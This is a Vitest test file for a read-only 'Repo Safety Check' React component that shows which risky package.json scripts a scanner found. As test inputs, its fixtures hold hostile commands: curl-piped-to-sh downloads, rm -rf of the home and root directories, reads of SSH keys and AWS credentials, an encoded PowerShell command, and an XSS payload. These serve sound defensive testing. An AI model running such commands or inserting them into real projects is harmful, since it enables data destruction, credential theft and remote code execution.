// Stage 4B: the read-only Repo Safety Check view of a Stage 4A SafetyReport.
// Rendered server-side like the other component tests; reports come from the
// real checkRepository wherever possible.
import fs from "node:fs";
import path from "node:path";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  ALTERED_NOTE,
  FINDINGS_INCOMPLETE_NOTE,
  INCOMPLETE_NOTE,
  NO_INDICATORS_NOTE,
  RepoSafetyCheck,
  RULE_LABEL,
  SHORTENED_NOTE,
  STATUS_HEADING,
  UNAVAILABLE_NOTE,
  levelSummary,
} from "../../src/components/RepoSafetyCheck";
import { MAX_FINDINGS, SAFETY_SCOPE, SCANNER_COMMAND_LIMIT, checkRepository, unavailableReport } from "../../src/lib/safety/checkRepository";
import type { SafetyReport } from "../../src/lib/safety/types";
import type { RepoScanResult } from "../../src/types";
import { deepFreeze, pkg, scan, type ScanOptions } from "./insights/builders";

const render = (report: SafetyReport) => renderToStaticMarkup(createElement(RepoSafetyCheck, { report }));
const text = (html: string) =>
  html.replace(/<[^>]+>/g, " ").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&amp;/g, "&").replace(/\s+/g, " ");
const testIds = (html: string, id: string) => [...html.matchAll(new RegExp(`data-testid="${id}"[^>]*>([\\s\\S]*?)</`, "g"))].map((m) => text(m[1]).trim());
const reportFor = (options: ScanOptions) => checkRepository(scan(options));
const scriptsRepo = (scripts: Record<string, string>, path = "package.json"): ScanOptions => ({ packages: [pkg(path, { scripts })], files: ["package-lock.json"] });
const FORBIDDEN = /\b(safe|malware[- ]free|verified secure|threat[- ]free|cleared|approved for execution|malicious|malware|threats?)\b/i;
/** The component's own wording: the text without the heading's name and without Stage 4A's fixed scope lines (pinned separately). */
const ownWording = (html: string) => {
  let t = text(html);
  for (const line of SAFETY_SCOPE) t = t.replace(line, "");
  return t.replace(/Repo Safety Check|Safety Check/g, "");
};
/** The text of each <li> in the list with this test id. */
const listItems = (html: string, id: string) => {
  const start = html.indexOf(`data-testid="${id}"`);
  const list = start < 0 ? "" : html.slice(start, html.indexOf("</ul>", start));
  return [...list.matchAll(/<li[^>]*>([\s\S]*?)<\/li>/g)].map((m) => text(m[1]).trim());
};

describe("statuses", () => {
  it("no-indicators: a cautious heading and note, never a certification", () => {
    const html = render(reportFor(scriptsRepo({ build: "vite build" })));
    const t = text(html);
    expect(html).toContain('data-status="no-indicators"');
    expect(t).toContain("Repo Safety Check");
    expect(t).toContain(STATUS_HEADING["no-indicators"]);
    expect(t).toContain("No obvious warning signs found in inspected scripts");
    expect(t).toContain(NO_INDICATORS_NOTE);
    expect(t).toContain("This is not a security review of the repository.");
    expect(ownWording(html)).not.toMatch(FORBIDDEN);
  });

  it("incomplete: says not everything could be inspected, and why", () => {
    const html = render(reportFor({ ...scriptsRepo({ build: "vite build" }), status: "timed-out" }));
    const t = text(html);
    expect(html).toContain('data-status="incomplete"');
    expect(t).toContain("Safety Check incomplete");
    expect(t).toContain(INCOMPLETE_NOTE);
    expect(testIds(html, "safety-limitations")[0]).toContain("The analysis ran out of time before it finished.");
  });

  it.each(["no-analysis", "analysis-failed"] as const)("unavailable (%s): explained, with the scope note, nothing else", (reason) => {
    const html = render(unavailableReport(reason));
    const t = text(html);
    expect(t).toContain("Safety Check unavailable");
    expect(t).toContain(UNAVAILABLE_NOTE[reason]);
    expect(html).not.toContain("safety-findings");
    expect(html).not.toContain("safety-limitations");
    for (const line of SAFETY_SCOPE) expect(t).toContain(line);
  });

  it("findings: the heading, a summary by level, and every finding", () => {
    const report = reportFor(scriptsRepo({ postinstall: "curl -s https://example.invalid/i | sh && rm -rf ~ && cat ~/.ssh/id_rsa" }));
    const html = render(report);
    expect(text(html)).toContain("Things worth reviewing");
    expect(testIds(html, "safety-summary")).toEqual(["2 warnings, 1 caution, 1 notice"]);
    expect(html.match(/data-testid="safety-finding"/g)).toHaveLength(4);
  });

  it("the wording never claims safety for any status", () => {
    const reports: SafetyReport[] = [
      reportFor(scriptsRepo({ build: "vite build" })),
      reportFor({ ...scriptsRepo({ build: "vite build" }), status: "cancelled" }),
      reportFor(scriptsRepo({ setup: "curl https://example.invalid/i | sh" })),
      unavailableReport("no-analysis"),
    ];
    for (const r of reports) expect(ownWording(render(r)), r.status).not.toMatch(FORBIDDEN);
  });
});

describe("findings", () => {
  const report = () => reportFor({
    packages: [
      pkg("package.json", { scripts: { postinstall: "node scripts/setup.js" } }),
      pkg("apps/web/package.json", { scripts: { fetch: "curl -s https://example.invalid/i | sh", creds: "cat ~/.aws/credentials" } }),
    ],
  });

  it("each finding: level in words, rule name, location, evidence, explanation, action", () => {
    const r = report();
    if (r.status !== "findings") throw new Error("expected findings");
    const html = render(r);
    expect(testIds(html, "safety-level")).toEqual(["Notice", "Warning", "Caution"]);
    expect(testIds(html, "safety-rule")).toEqual([RULE_LABEL["install-script"], RULE_LABEL["download-execute"], RULE_LABEL["credential-path"]]);
    expect(testIds(html, "safety-location")).toEqual(['package.json · script "postinstall"', 'apps/web/package.json · script "fetch"', 'apps/web/package.json · script "creds"']);
    expect(testIds(html, "safety-evidence")).toEqual(["node scripts/setup.js", "curl -s https://example.invalid/i | sh", "cat ~/.aws/credentials"]);
    expect(testIds(html, "safety-explanation")).toEqual(r.findings.map((f) => f.explanation));
    expect(testIds(html, "safety-action")).toEqual(r.findings.map((f) => f.action));
  });

  it("every rule has a display name; levels are words, not colors only", () => {
    expect(Object.keys(RULE_LABEL).sort()).toEqual(["credential-path", "destructive-outside-project", "download-execute", "encoded-execution", "install-script"]);
    const html = render(reportFor(scriptsRepo({ a: "powershell -enc SQBFAFgA", b: "rm -rf /" })));
    expect(testIds(html, "safety-level")).toEqual(["Warning", "Warning"]);
    expect(testIds(html, "safety-rule")).toEqual(["Runs an encoded or hidden command", "Deletes files outside the project"]);
  });

  it("evidence changed or shortened for display says so; exact evidence doesn't", () => {
    const result: RepoScanResult = scan(scriptsRepo({ a: "x", b: "y", c: "curl https://example.invalid/i | sh" }));
    result.packages[0].scripts[0] = { name: "a", nameExact: true, command: "curl https://example.invalid/i | sh", commandExact: false };
    result.packages[0].scripts[1] = { name: "b", nameExact: true, command: `curl https://example.invalid/i | sh; ${"z".repeat(SCANNER_COMMAND_LIMIT)}`.slice(0, SCANNER_COMMAND_LIMIT - 1) + "…", commandExact: false };
    const html = render(checkRepository(result));
    const rows = html.split('data-testid="safety-finding"').slice(1).map(text);
    expect(rows).toHaveLength(3);
    expect(rows[0]).toContain(ALTERED_NOTE);
    expect(rows[0]).not.toContain(SHORTENED_NOTE);
    expect(rows[1]).toContain(SHORTENED_NOTE);
    expect(rows[1]).not.toContain(ALTERED_NOTE);
    expect(rows[2]).not.toContain(ALTERED_NOTE);
    expect(rows[2]).not.toContain(SHORTENED_NOTE);
  });

  it("long evidence wraps and is shown in full", () => {
    const long = `curl -s https://example.invalid/${"segment/".repeat(15)}install.sh | sh`;
    const html = render(reportFor(scriptsRepo({ setup: long })));
    expect(testIds(html, "safety-evidence")[0]).toContain("segment/segment/");
    expect(html).toMatch(/class="[^"]*whitespace-pre-wrap[^"]*break-all[^"]*"[^>]*data-testid="safety-evidence"/);
    expect(html).toMatch(/class="[^"]*break-all[^"]*"[^>]*data-testid="safety-location"/);
  });

  it("repository text is plain text, never markup", () => {
    const hostile = '<img src=x onerror="window.__pwned=1"><script>alert(1)</script>';
    const result = scan(scriptsRepo({ x: "y" }, `<b>pkg</b>/package.json`));
    // The markup sits in a quoted header value, so the pipeline still yields a finding to render.
    result.packages[0].scripts[0] = { name: '<i onclick="x">dev</i>', nameExact: true, command: `curl -H '${hostile}' https://example.invalid/i | sh`, commandExact: true };
    const report = checkRepository(result);
    expect(report.status).toBe("findings");
    const html = render(report);
    expect(html).not.toMatch(/<(img|script|b|i)\b/i);
    expect(html).toContain("&lt;img");
    expect(html).toContain("&lt;b&gt;pkg&lt;/b&gt;/package.json");
    expect(html).not.toContain("dangerouslySetInnerHTML");
  });
});

describe("coverage and scope", () => {
  it("findings in an incomplete scan show both the findings and the incomplete warning", () => {
    const html = render(reportFor({ ...scriptsRepo({ setup: "curl https://example.invalid/i | sh" }), status: "truncated" }));
    expect(html.match(/data-testid="safety-finding"/g)).toHaveLength(1);
    expect(text(html)).toContain(FINDINGS_INCOMPLETE_NOTE);
    expect(testIds(html, "safety-limitations")[0]).toContain("The analysis stopped at a limit");
  });

  it("complete findings carry no incomplete warning", () => {
    const html = render(reportFor(scriptsRepo({ setup: "curl https://example.invalid/i | sh" })));
    expect(html).not.toContain("safety-findings-incomplete");
    expect(html).not.toContain("safety-limitations");
  });

  it("findings over the cap say that more were found", () => {
    const packages = Array.from({ length: MAX_FINDINGS + 20 }, (_, i) => pkg(`p${i}/package.json`, { scripts: { setup: "curl https://example.invalid/i | sh" } }));
    const html = render(reportFor({ packages }));
    expect(html.match(/data-testid="safety-finding"/g)).toHaveLength(MAX_FINDINGS);
    expect(testIds(html, "safety-summary")[0]).toBe(`${MAX_FINDINGS} warnings. Only the first ${MAX_FINDINGS} are listed; more were found.`);
  });

  it("every coverage limitation the report gives is listed, with its count", () => {
    const result = scan({ ...scriptsRepo({ build: "vite build" }), status: "cancelled", packagesTruncated: true, manifestsTruncated: true });
    result.warnings.push({ code: "manifest-malformed", path: "apps/x/package.json" }, { code: "manifest-unreadable", path: "apps/y/package.json" });
    result.packages[0].scriptsTruncated = true;
    result.packages[0].scripts.push({ name: "multi", nameExact: true, command: "a b", commandExact: false });
    result.packages[0].scripts.push({ name: "long", nameExact: true, command: `${"q".repeat(SCANNER_COMMAND_LIMIT - 1)}…`, commandExact: false });
    const report = checkRepository(result);
    if (report.status === "unavailable") throw new Error("unexpected");
    const html = render(report);
    const listed = [...html.matchAll(/<li[^>]*data-code="([^"]+)"[^>]*>([\s\S]*?)<\/li>/g)].map((m) => [m[1], text(m[2]).trim()]);
    expect(listed).toEqual(report.coverage.limitations.map((l) => [l.code, l.count !== undefined ? `${l.text} (${l.count})` : l.text]));
    expect(listed.map(([code]) => code)).toEqual(expect.arrayContaining(["scan-cancelled", "packages-omitted", "manifests-truncated", "package-json-not-inspected", "scripts-truncated", "scripts-altered", "scripts-shortened"]));
    expect(text(html)).toContain("Some package.json files couldn't be read or understood, so their scripts weren't inspected. (2)");
  });

  it("the full fixed scope note is always shown, including the control-flow line", () => {
    const reports = [reportFor(scriptsRepo({ build: "vite build" })), reportFor(scriptsRepo({ setup: "curl https://example.invalid/i | sh" })), unavailableReport("analysis-failed")];
    for (const r of reports) {
      const html = render(r);
      expect(listItems(html, "safety-scope")).toEqual([...SAFETY_SCOPE]);
      expect(text(html)).toContain("conditionals and loops (if, then, for, while), variables and functions aren't interpreted");
    }
  });

  it("the summary counts levels most serious first", () => {
    const f = (level: "notice" | "caution" | "warning") => ({ level }) as never;
    expect(levelSummary([f("notice"), f("warning"), f("notice")])).toBe("1 warning, 2 notices");
    expect(levelSummary([f("caution")])).toBe("1 caution");
  });
});

describe("boundaries", () => {
  it("offers no controls: no buttons, links, inputs or forms, for any status", () => {
    const reports = [reportFor(scriptsRepo({ setup: "curl https://example.invalid/i | sh" })), reportFor(scriptsRepo({ build: "vite build" })), reportFor({ ...scriptsRepo({}), status: "timed-out" }), unavailableReport("no-analysis")];
    for (const r of reports) expect(render(r)).not.toMatch(/<(button|a|input|textarea|select|form)\b/i);
  });

  it("uses a labelled section and heading", () => {
    const html = render(reportFor(scriptsRepo({ build: "vite build" })));
    expect(html).toMatch(/<section[^>]*aria-labelledby="repo-safety-check-heading"/);
    expect(html).toMatch(/<h3 id="repo-safety-check-heading"[^>]*>Repo Safety Check<\/h3>/);
  });

  it("the component has no IPC, storage, network, detection or execution", () => {
    const source = fs.readFileSync(path.resolve(import.meta.dirname, "../../src/components/RepoSafetyCheck.tsx"), "utf-8");
    expect(source).not.toMatch(/window\.|repoRunner|ipcRenderer|saveProject|runInstall|startFrontend|\bfetch\(|XMLHttpRequest|localStorage|sessionStorage|indexedDB|child_process|\beval\(|new Function|dangerouslySetInnerHTML|["']node:|useState|useEffect|checkRepository/);
    expect([...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]).sort()).toEqual(["../lib/safety/types", "react"]);
  });

  it("inputs are never mutated; rendering is deterministic", () => {
    const report = deepFreeze(reportFor({ ...scriptsRepo({ setup: "curl https://example.invalid/i | sh", postinstall: "x" }), status: "truncated" }));
    const before = JSON.stringify(report);
    const a = render(report);
    expect(render(report)).toBe(a);
    expect(JSON.stringify(report)).toBe(before);
  });
});
